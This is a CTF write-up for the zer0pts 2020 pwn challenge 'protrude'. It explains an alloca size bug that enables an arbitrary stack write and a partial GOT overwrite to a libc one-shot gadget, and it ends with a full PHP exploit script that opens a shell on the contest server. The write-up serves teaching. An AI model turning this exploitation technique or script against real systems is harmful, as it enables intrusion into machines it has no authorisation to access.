# protrude - zer0pts CTF 2020 (pwn, 525p, 22 solved)
## Introduction

protrude is a pwn task.

An archive containing a binary, its source code and a libc is provided.

The binary asks the user for up to 22 numbers and calculates the sum of these
numbers.

## Vulnerability

The binary allocates room on the stack with `alloca`. It ensure that there is no
more than 22 numbers and allocates `n * 4` bytes.

It then reads `n` long integers, and calculates the result.

The vulnerability lies in the fact that a long integer does not have a size of
4. The allocated buffer is half too short to hold every numbers.

The variables on the stack are ordered this way:
```c
void  *rip;
void  *rbp;
void  *rbx;
long   canary;
long  *array;
long   sum;
size_t i;
long   array[k];
long   array[k - 1];
long   array[k - 2];
long   array[k - 3];
...
```

Writing past the array will overwrite the index at which the user's input is
read. It is possible to write anywhere by overwriting this index to point to the
`array` pointer, and overwrite it in turn with an other pointer.

## Exploitation

It is not possible to ROP because it is not possible to leak the canary (or any
address) : the program quits once the sum is printed, with no way to come back
to the main loop.

It is possible however to overwrite the global offset table. Replacing a pointer
with a pointer to the libc because the libc is subject to ASLR.

However, it is possible to overwrite partially one of the pointer and have a
reduced probability of guessing the ASLR.

One possibility is to partially overwrite the last 3 bytes of the pointer to
`printf` with `0x04526A`, which points to a one-shot gadget (satisfied when
`RSP + 0x30` is NULL). This strategy should work once every 4096 times on
average.

**Flag**: `zer0pts{0ops_long_is_8_byt3s_l0ng}`

## Appendices

### pwn.php

```php
#!/usr/bin/php
<?php
require_once("Socket.php");

$t = new Socket("13.231.207.73", 9005);

/* Speed up things by sending every messages at once */
$t->write(str_pad("22", 0x20));
$t->write(str_repeat("0", 0x20 * 14));
$t->write(str_pad("15", 0x20));
$t->write(str_pad(0x00601030 - 0x11 * 8 - 5, 0x20));
$t->write(str_pad(0x04526A << (5 * 8), 0x20));
$t->write("echo shell\n");

/* Read every responses */
$t->expect("n = ");
for($i = 0; $i < 15; $i++)
	$t->expect("num[" . ($i + 1) . "] = ");
$t->expect("num[17] = ");
$t->expect("num[18] = ");
$t->expectLine("shell");

printf("[*] Shell\n");
$t->pipe();
```
